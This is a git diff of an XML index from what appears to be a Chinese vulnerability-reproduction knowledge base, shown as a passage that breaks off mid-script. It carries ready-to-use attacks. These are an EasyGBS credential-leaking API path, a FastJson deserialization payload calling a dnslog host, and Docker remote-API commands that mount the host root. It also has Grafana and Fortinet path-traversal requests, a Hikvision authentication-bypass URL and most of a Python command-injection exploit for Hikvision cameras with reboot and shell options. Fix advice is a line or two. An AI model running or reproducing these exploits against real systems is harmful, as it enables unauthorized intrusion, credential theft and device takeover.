@@ -27,6 +27,26 @@
       </categories>
   </entry>
   <entry>
+    <title>EasyGBS</title>
+    <url>/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/EasyGBS.html</url>
+    <content><![CDATA[<h1 id="EasyGBS未授权访问">1. EasyGBS未授权访问</h1><h2 id="风险描述">1.1. 风险描述:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者可以直接访问平台的API接口文档，从而获取系统的API接口造成信息泄露。再通过泄露的账号密码登录到EasyGBS后台。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现">1.2. 漏洞复现:</h2><p><img src="https://s2.loli.net/2022/07/20/cWCPnp1HkDI8TFx.png" alt="image-20220720125708082"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问下面API接口网址获取登录账号密码</span><br><span class="line">/api/v1/userlist?pageindex=0&amp;pagesize=10</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/20/kUiXEVRHJsbLxI7.png" alt="image-20220720124835234"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过burp抓包发现用户名密码为GET方式传参，修改成正确的用户名和password即可登录。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/20/2SEonP4iaekRu6Q.png" alt="image-20220720125958474"></p>
+<p><img src="https://s2.loli.net/2022/07/20/uWcxLNgviEYAh7Q.png" alt="image-20220720124649601"></p>
+<h4 id="修复建议">1.2.0.1. 修复建议:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、禁止API接口未授权访问。</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网络设备</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Atlassian-Bitbucket</title>
     <url>/pages/WEB%E5%BA%94%E7%94%A8/Atlassian-Bitbucket-Server.html</url>
     <content><![CDATA[<h1 id="Atlassian-Bitbucket-Server">1. Atlassian Bitbucket Server</h1><h2 id="CVE-2022-36804">1.1. CVE-2022-36804</h2><h3 id="漏洞描述">1.1.1. 漏洞描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Atlassian 发布安全公告，披露了 Bitbucket Server 和 Data Center 在 7.0.0 版中引入了一个严重安全漏洞。官方漏洞公告中描述 Bitbucket Server 和 Data Center 多个 API 端点存在命令注入漏洞，漏洞触发条件是攻击者具备公开项目的访问权限或者私有项目的可读权限，影响版本从 7.0 到 8.3</span><br></pre></td></tr></table></figure>
@@ -48,47 +68,6 @@
 ]]></content>
       <categories>
         <category>WEB应用</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>EasyGBS</title>
-    <url>/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/EasyGBS.html</url>
-    <content><![CDATA[<h1 id="EasyGBS未授权访问">1. EasyGBS未授权访问</h1><h2 id="风险描述">1.1. 风险描述:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者可以直接访问平台的API接口文档，从而获取系统的API接口造成信息泄露。再通过泄露的账号密码登录到EasyGBS后台。</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞复现">1.2. 漏洞复现:</h2><p><img src="https://s2.loli.net/2022/07/20/cWCPnp1HkDI8TFx.png" alt="image-20220720125708082"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问下面API接口网址获取登录账号密码</span><br><span class="line">/api/v1/userlist?pageindex=0&amp;pagesize=10</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/07/20/kUiXEVRHJsbLxI7.png" alt="image-20220720124835234"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过burp抓包发现用户名密码为GET方式传参，修改成正确的用户名和password即可登录。</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/07/20/2SEonP4iaekRu6Q.png" alt="image-20220720125958474"></p>
-<p><img src="https://s2.loli.net/2022/07/20/uWcxLNgviEYAh7Q.png" alt="image-20220720124649601"></p>
-<h4 id="修复建议">1.2.0.1. 修复建议:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、禁止API接口未授权访问。</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>网络设备</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Docker</title>
-    <url>/pages/%E4%BA%91%E6%94%BB%E9%98%B2/Docker.html</url>
-    <content><![CDATA[<h1 id="Docker未授权访问">1. Docker未授权访问</h1><p> <code>fofa查询: banner=&quot;docker&quot; &amp;&amp; port=&quot;2375&quot;</code></p>
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220907123212722.png" alt="image-20220907123212722"></p>
-<h2 id="漏洞描述">1.1. 漏洞描述:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的LINUX机器上，也可以实现虚拟化，Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。Docker Remote API如配置不当可导致未授权访问。</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞危害：">1.2. 漏洞危害：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，并且可以执行Docker命令。</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞验证">1.3. 漏洞验证:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx:2375/version</span><br><span class="line">docker -H tcp://x.x.x.x:2375 ps </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220907124059370.png" alt="image-20220907124059370"></p>
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220926093302948.png" alt="image-20220926093302948"></p>
-<h2 id="漏洞利用">1.4. 漏洞利用:</h2><p><a href="https://blog.csdn.net/qq_45746286/article/details/128927573">利用文章</a><code>https://blog.csdn.net/qq_45746286/article/details/128927573</code></p>
-<p>写入密钥免密登录</p>
-<p><code>docker -H tcp://ip:2375 run -it -v /:/mnt image_id /bin/bash</code></p>
-]]></content>
-      <categories>
-        <category>云攻防</category>
       </categories>
   </entry>
   <entry>
@@ -118,6 +97,43 @@
       </categories>
   </entry>
   <entry>
+    <title>FastJson</title>
+    <url>/pages/WEB%E6%A1%86%E6%9E%B6/Fastjson.html</url>
+    <content><![CDATA[<h1 id="FastJson反序列化漏洞">1. FastJson反序列化漏洞</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastjson是啊里巴巴的的开源库，用于对JSON格式的数据进行解析和打包，fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用：">1.2. 漏洞利用：</h2><p>可以通过burp插件FastJsonScan实现被动扫描检测。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;x&quot;:			&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;wq122qedk25rwzt.fwxxn1.dnslog.cn&quot;,&quot;portToConnectTo&quot;:80,&quot;info&quot;:&#123;&quot;user&quot;:&quot;root&quot;,&quot;password&quot;:&quot;ubuntu&quot;,&quot;useSSL&quot;:&quot;false&quot;,&quot;statementInterceptors&quot;:&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;&#125;,&quot;databaseToConnectTo&quot;:&quot;mysql&quot;,&quot;url&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416091752822.png" alt="image-20230416091752822"></p>
+<h2 id="漏洞修复：">1.3. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、将fastjson升级至最新版本。</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>WEB框架</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Docker</title>
+    <url>/pages/%E4%BA%91%E6%94%BB%E9%98%B2/Docker.html</url>
+    <content><![CDATA[<h1 id="Docker未授权访问">1. Docker未授权访问</h1><p> <code>fofa查询: banner=&quot;docker&quot; &amp;&amp; port=&quot;2375&quot;</code></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220907123212722.png" alt="image-20220907123212722"></p>
+<h2 id="漏洞描述">1.1. 漏洞描述:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的LINUX机器上，也可以实现虚拟化，Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。Docker Remote API如配置不当可导致未授权访问。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞危害：">1.2. 漏洞危害：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，并且可以执行Docker命令。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞验证">1.3. 漏洞验证:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx:2375/version</span><br><span class="line">docker -H tcp://x.x.x.x:2375 ps </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220907124059370.png" alt="image-20220907124059370"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220926093302948.png" alt="image-20220926093302948"></p>
+<h2 id="漏洞利用">1.4. 漏洞利用:</h2><p><a href="https://blog.csdn.net/qq_45746286/article/details/128927573">利用文章</a><code>https://blog.csdn.net/qq_45746286/article/details/128927573</code></p>
+<p>写入密钥免密登录</p>
+<p><code>docker -H tcp://ip:2375 run -it -v /:/mnt image_id /bin/bash</code></p>
+]]></content>
+      <categories>
+        <category>云攻防</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Fortinet</title>
     <url>/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Fortinet.html</url>
     <content><![CDATA[<h1 id="CVE-2018-13379">1. CVE-2018-13379</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession </span><br></pre></td></tr></table></figure>
@@ -125,27 +141,6 @@
 <h1 id="CVE-2022-40684">2. CVE-2022-40684</h1>]]></content>
       <categories>
         <category>网络设备</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Grafana</title>
-    <url>/pages/%E4%BA%91%E6%94%BB%E9%98%B2/Grafana.html</url>
-    <content><![CDATA[<h1 id="Grafana-8-x-任意文件读取">1. Grafana 8.x 任意文件读取</h1><h2 id="漏洞原理">1.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">该漏洞是由插件模块引起的，该模块能够提供插件文件夹内的静态文件。但是对于检查锁定，攻击者可以使用../从插件文件夹升级到父文件夹并下载任意文件。</span><br></pre></td></tr></table></figure>
-
-<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8.0.0-beta1 &lt;= Grafana &lt;= 8.3.0</span><br></pre></td></tr></table></figure>
-
-<h2 id="环境搭建">1.3. 环境搭建:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机: ubuntu 192.168.179.134</span><br><span class="line">		</span><br><span class="line">靶机部署:</span><br><span class="line">cd vulhub/grafana/CVE-2021-43798</span><br><span class="line">sudo docker-compose up -d // 开启环境</span><br><span class="line">访问靶机3000端口，出现下图页面即搭建完成</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/07/11/Ywe7qFNBx1htvi3.png" alt="image-20220711135552251"></p>
-<h2 id="漏洞复现">1.4. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、要利用该漏洞，首先需要知道一个有效的插件 id，例如alertlist，以下是一些常见的插件 id：</span><br><span class="line"></span><br><span class="line">alertlist</span><br><span class="line">cloudwatch</span><br><span class="line">dashlist</span><br><span class="line">elasticsearch</span><br><span class="line">graph</span><br><span class="line">graphite</span><br><span class="line">heatmap</span><br><span class="line">influxdb</span><br><span class="line">mysql</span><br><span class="line">opentsdb</span><br><span class="line">pluginlist</span><br><span class="line">postgres</span><br><span class="line">prometheus</span><br><span class="line">stackdriver</span><br><span class="line">table</span><br><span class="line">text</span><br><span class="line"></span><br><span class="line">2、发送以下请求以检索/etc/passwd（可以将 alertlist 替换为任何有效的插件 id）:</span><br><span class="line">/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/07/11/I5E3OZmMDpCP6zS.png" alt="image-20220711140913715"></p>
-<p>漏洞修复:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、官方已更新到V8.3.1版本，对漏洞进行了修复。</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>云攻防</category>
       </categories>
   </entry>
   <entry>
@@ -191,35 +186,24 @@
       </categories>
   </entry>
   <entry>
-    <title>Hikvision</title>
-    <url>/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Hikvison.html</url>
-    <content><![CDATA[<h1 id="Hikvision摄像头">1. Hikvision摄像头</h1><h2 id="CVE-2017-7921-身份认证绕过">1.1. CVE-2017-7921(身份认证绕过)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先访问	</span><br><span class="line">/Security/users?auth=YWRtaW46MTEK </span><br><span class="line">再访问	</span><br><span class="line">/onvif-http/snapshot?auth=YWRtaW46MTEK</span><br><span class="line">一直刷新可以一直获取当前快照</span><br></pre></td></tr></table></figure>
+    <title>Grafana</title>
+    <url>/pages/%E4%BA%91%E6%94%BB%E9%98%B2/Grafana.html</url>
+    <content><![CDATA[<h1 id="Grafana-8-x-任意文件读取">1. Grafana 8.x 任意文件读取</h1><h2 id="漏洞原理">1.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">该漏洞是由插件模块引起的，该模块能够提供插件文件夹内的静态文件。但是对于检查锁定，攻击者可以使用../从插件文件夹升级到父文件夹并下载任意文件。</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916182925765.png" alt="image-20220916182925765"></p>
-<h2 id="CVE-2021-36260-RCE">1.2. CVE-2021-36260(RCE)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-36260.py --rhost x.x.x.x --port 80 --cmd &quot;ls -all&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8.0.0-beta1 &lt;= Grafana &lt;= 8.3.0</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916182504585.png" alt="image-20220916182504585"></p>
-<h3 id="EXP">1.2.1. EXP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Exploit Title: Hikvision Web Server Build 210702 - Command Injection</span><br><span class="line"># Exploit Author: bashis</span><br><span class="line"># Vendor Homepage: https://www.hikvision.com/</span><br><span class="line"># Version: 1.0</span><br><span class="line"># CVE: CVE-2021-36260</span><br><span class="line"># Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html</span><br><span class="line"></span><br><span class="line"># All credit to Watchful_IP</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Note:</span><br><span class="line">1)  This code will _not_ verify if remote is Hikvision device or not.</span><br><span class="line">2)  Most of my interest in this code has been concentrated on how to</span><br><span class="line">    reliably detect vulnerable and/or exploitable devices.</span><br><span class="line">    Some devices are easy to detect, verify and exploit the vulnerability,</span><br><span class="line">    other devices may be vulnerable but not so easy to verify and exploit.</span><br><span class="line">    I think the combined verification code should have very high accuracy.</span><br><span class="line">3)  &#x27;safe check&#x27; (--check) will try write and read for verification</span><br><span class="line">    &#x27;unsafe check&#x27; (--reboot) will try reboot the device for verification</span><br><span class="line"></span><br><span class="line">[Examples]</span><br><span class="line">Safe vulnerability/verify check:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check</span><br><span class="line"></span><br><span class="line">Safe and unsafe vulnerability/verify check:</span><br><span class="line">(will only use &#x27;unsafe check&#x27; if not verified with &#x27;safe check&#x27;)</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --reboot</span><br><span class="line"></span><br><span class="line">Unsafe vulnerability/verify check:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --reboot</span><br><span class="line"></span><br><span class="line">Launch and connect to SSH shell:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shell</span><br><span class="line"></span><br><span class="line">Execute command:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd &quot;ls -l&quot;</span><br><span class="line"></span><br><span class="line">Execute blind command:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind &quot;reboot&quot;</span><br><span class="line"></span><br><span class="line">$./CVE-2021-36260.py -h</span><br><span class="line">[*] Hikvision CVE-2021-36260</span><br><span class="line">[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)</span><br><span class="line">usage: CVE-2021-36260.py [-h] --rhost RHOST [--rport RPORT] [--check]</span><br><span class="line">                         [--reboot] [--shell] [--cmd CMD]</span><br><span class="line">                         [--cmd_blind CMD_BLIND] [--noverify]</span><br><span class="line">                         [--proto &#123;http,https&#125;]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  --rhost RHOST         Remote Target Address (IP/FQDN)</span><br><span class="line">  --rport RPORT         Remote Target Port</span><br><span class="line">  --check               Check if vulnerable</span><br><span class="line">  --reboot              Reboot if vulnerable</span><br><span class="line">  --shell               Launch SSH shell</span><br><span class="line">  --cmd CMD             execute cmd (i.e: &quot;ls -l&quot;)</span><br><span class="line">  --cmd_blind CMD_BLIND</span><br><span class="line">                        execute blind cmd (i.e: &quot;reboot&quot;)</span><br><span class="line">  --noverify            Do not verify if vulnerable</span><br><span class="line">  --proto &#123;http,https&#125;  Protocol used</span><br><span class="line">$</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import argparse</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from requests import packages</span><br><span class="line">from requests.packages import urllib3</span><br><span class="line">from requests.packages.urllib3 import exceptions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Http(object):</span><br><span class="line">    def __init__(self, rhost, rport, proto, timeout=60):</span><br><span class="line">        super(Http, self).__init__()</span><br><span class="line"></span><br><span class="line">        self.rhost = rhost</span><br><span class="line">        self.rport = rport</span><br><span class="line">        self.proto = proto</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">        self.remote = None</span><br><span class="line">        self.uri = None</span><br><span class="line"></span><br><span class="line">        &quot;&quot;&quot; Most devices will use self-signed certificates, suppress any warnings &quot;&quot;&quot;</span><br><span class="line">        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">        self.remote = requests.Session()</span><br><span class="line"></span><br><span class="line">        self._init_uri()</span><br><span class="line"></span><br><span class="line">        self.remote.headers.update(&#123;</span><br><span class="line">            &#x27;Host&#x27;: f&#x27;&#123;self.rhost&#125;:&#123;self.rport&#125;&#x27;,</span><br><span class="line">            &#x27;Accept&#x27;: &#x27;*/*&#x27;,</span><br><span class="line">            &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;,</span><br><span class="line">            &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;,</span><br><span class="line">            &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="line">            &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.9,sv;q=0.8&#x27;,</span><br><span class="line">        &#125;)</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        self.remote.proxies.update(&#123;</span><br><span class="line">            # &#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;,</span><br><span class="line">        &#125;)</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def send(self, url=None, query_args=None, timeout=5):</span><br><span class="line"></span><br><span class="line">        if query_args:</span><br><span class="line">            &quot;&quot;&quot;Some devices can handle more, others less, 22 bytes seems like a good compromise&quot;&quot;&quot;</span><br><span class="line">            if len(query_args) &gt; 22:</span><br><span class="line">                print(f&#x27;[!] Error: Command &quot;&#123;query_args&#125;&quot; to long (&#123;len(query_args)&#125;)&#x27;)</span><br><span class="line">                return None</span><br><span class="line"></span><br><span class="line">        &quot;&quot;&quot;This weird code will try automatically switch between http/https</span><br><span class="line">        and update Host</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        try:</span><br><span class="line">            if url and not query_args:</span><br><span class="line">                return self.get(url, timeout)</span><br><span class="line">            else:</span><br><span class="line">                data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout)</span><br><span class="line">        except requests.exceptions.ConnectionError:</span><br><span class="line">            self.proto = &#x27;https&#x27; if self.proto == &#x27;http&#x27; else &#x27;https&#x27;</span><br><span class="line">            self._init_uri()</span><br><span class="line">            try:</span><br><span class="line">                if url and not query_args:</span><br><span class="line">                    return self.get(url, timeout)</span><br><span class="line">                else:</span><br><span class="line">                    data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout)</span><br><span class="line">            except requests.exceptions.ConnectionError:</span><br><span class="line">                return None</span><br><span class="line">        except requests.exceptions.RequestException:</span><br><span class="line">            return None</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            return None</span><br><span class="line"></span><br><span class="line">        &quot;&quot;&quot;302 when requesting http on https enabled device&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        if data.status_code == 302:</span><br><span class="line">            redirect = data.headers.get(&#x27;Location&#x27;)</span><br><span class="line">            self.uri = redirect[:redirect.rfind(&#x27;/&#x27;)]</span><br><span class="line">            self._update_host()</span><br><span class="line">            if url and not query_args:</span><br><span class="line">                return self.get(url, timeout)</span><br><span class="line">            else:</span><br><span class="line">                data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout)</span><br><span class="line"></span><br><span class="line">        return data</span><br><span class="line"></span><br><span class="line">    def _update_host(self):</span><br><span class="line">        if not self.remote.headers.get(&#x27;Host&#x27;) == self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:]:</span><br><span class="line">            self.remote.headers.update(&#123;</span><br><span class="line">                &#x27;Host&#x27;: self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:],</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">    def _init_uri(self):</span><br><span class="line">        self.uri = &#x27;&#123;proto&#125;://&#123;rhost&#125;:&#123;rport&#125;&#x27;.format(proto=self.proto, rhost=self.rhost, rport=str(self.rport))</span><br><span class="line"></span><br><span class="line">    def put(self, url, query_args, timeout):</span><br><span class="line">        &quot;&quot;&quot;Command injection in the &lt;language&gt; tag&quot;&quot;&quot;</span><br><span class="line">        query_args = &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27; \</span><br><span class="line">                     f&#x27;&lt;language&gt;$(&#123;query_args&#125;)&lt;/language&gt;&#x27;</span><br><span class="line">        return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout)</span><br><span class="line"></span><br><span class="line">    def get(self, url, timeout):</span><br><span class="line">        return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(remote, args):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    status_code == 200 (OK);</span><br><span class="line">        Verified vulnerable and exploitable</span><br><span class="line">    status_code == 500 (Internal Server Error);</span><br><span class="line">        Device may be vulnerable, but most likely not</span><br><span class="line">        The SDK webLanguage tag is there, but generate status_code 500 when language not found</span><br><span class="line">        I.e. Exist: &lt;language&gt;en&lt;/language&gt; (200), not exist: &lt;language&gt;EN&lt;/language&gt; (500)</span><br><span class="line">        (Issue: Could also be other directory than &#x27;webLib&#x27;, r/o FS etc...)</span><br><span class="line">    status_code == 401 (Unauthorized);</span><br><span class="line">        Defiantly not vulnerable</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if args.noverify:</span><br><span class="line">        print(f&#x27;[*] Not verifying remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;)</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">    data = remote.send(url=&#x27;/&#x27;, query_args=None)</span><br><span class="line">    if data is None:</span><br><span class="line">        print(f&#x27;[-] Cannot establish connection to &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;)</span><br><span class="line">        return None</span><br><span class="line">    print(&#x27;[i] ETag:&#x27;, data.headers.get(&#x27;ETag&#x27;))</span><br><span class="line"></span><br><span class="line">    data = remote.send(query_args=&#x27;&gt;webLib/c&#x27;)</span><br><span class="line">    if data is None or data.status_code == 404:</span><br><span class="line">        print(f&#x27;[-] &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; do not looks like Hikvision&#x27;)</span><br><span class="line">        return False</span><br><span class="line">    status_code = data.status_code</span><br><span class="line"></span><br><span class="line">    data = remote.send(url=&#x27;/c&#x27;, query_args=None)</span><br><span class="line">    if not data.status_code == 200:</span><br><span class="line">        &quot;&quot;&quot;We could not verify command injection&quot;&quot;&quot;</span><br><span class="line">        if status_code == 500:</span><br><span class="line">            print(f&#x27;[-] Could not verify if vulnerable (Code: &#123;status_code&#125;)&#x27;)</span><br><span class="line">            if args.reboot:</span><br><span class="line">                return check_reboot(remote, args)</span><br><span class="line">        else:</span><br><span class="line">            print(f&#x27;[+] Remote is not vulnerable (Code: &#123;status_code&#125;)&#x27;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    print(&#x27;[!] Remote is verified exploitable&#x27;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_reboot(remote, args):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    We sending &#x27;reboot&#x27;, wait 2 sec, then checking with GET request.</span><br><span class="line">    - if there is data returned, we can assume remote is not vulnerable.</span><br><span class="line">    - If there is no connection or data returned, we can assume remote is vulnerable.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if args.check:</span><br><span class="line">        print(&#x27;[i] Checking if vulnerable with &quot;reboot&quot;&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; with &quot;reboot&quot;&#x27;)</span><br><span class="line">    remote.send(query_args=&#x27;reboot&#x27;)</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    if not remote.send(url=&#x27;/&#x27;, query_args=None):</span><br><span class="line">        print(&#x27;[!] Remote is vulnerable&#x27;)</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;[+] Remote is not vulnerable&#x27;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def cmd(remote, args):</span><br><span class="line">    if not check(remote, args):</span><br><span class="line">        return False</span><br><span class="line">    data = remote.send(query_args=f&#x27;&#123;args.cmd&#125;&gt;webLib/x&#x27;)</span><br><span class="line">    if data is None:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    data = remote.send(url=&#x27;/x&#x27;, query_args=None)</span><br><span class="line">    if data is None or not data.status_code == 200:</span><br><span class="line">        print(f&#x27;[!] Error execute cmd &quot;&#123;args.cmd&#125;&quot;&#x27;)</span><br><span class="line">        return False</span><br><span class="line">    print(data.text)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def cmd_blind(remote, args):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Blind command injection</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if not check(remote, args):</span><br><span class="line">        return False</span><br><span class="line">    data = remote.send(query_args=f&#x27;&#123;args.cmd_blind&#125;&#x27;)</span><br><span class="line">    if data is None or not data.status_code == 500:</span><br><span class="line">        print(f&#x27;[-] Error execute cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;)</span><br><span class="line">        return False</span><br><span class="line">    